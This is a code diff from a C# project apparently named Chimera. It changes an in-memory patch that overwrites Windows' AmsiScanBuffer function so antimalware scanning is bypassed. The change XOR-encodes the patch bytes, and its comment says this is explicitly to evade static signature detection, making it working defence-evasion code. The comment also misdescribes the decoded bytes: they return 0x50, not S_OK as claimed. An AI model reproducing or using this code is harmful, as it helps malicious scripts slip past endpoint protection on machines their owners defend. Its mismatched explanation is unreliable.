@@ -96,8 +96,14 @@ namespace Chimera
                 IntPtr fn = GetProcAddress(amsi, "AmsiScanBuffer");
                 if (fn == IntPtr.Zero) return;
 
-                // mov eax, 0x80070057 ; ret  → always returns AMSI_RESULT_CLEAN
-                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                // Patch bytes XOR-encoded with key 0x41 to avoid static signature detection.
+                // Decodes to: xor eax,eax (31 C0) ; mov al,0x50 (B0 50) ; ret (C3)
+                // Makes AmsiScanBuffer return S_OK with amsiResult=AMSI_RESULT_CLEAN
+                byte[] enc = { 0x70, 0x81, 0xF1, 0x11, 0x82 };
+                byte[] patch = new byte[enc.Length];
+                for (int i = 0; i < enc.Length; i++)
+                    patch[i] = (byte)(enc[i] ^ XorKey);
+
                 uint old;
                 VirtualProtect(fn, (uint)patch.Length, 0x40, out old);
                 Marshal.Copy(patch, 0, fn, patch.Length);
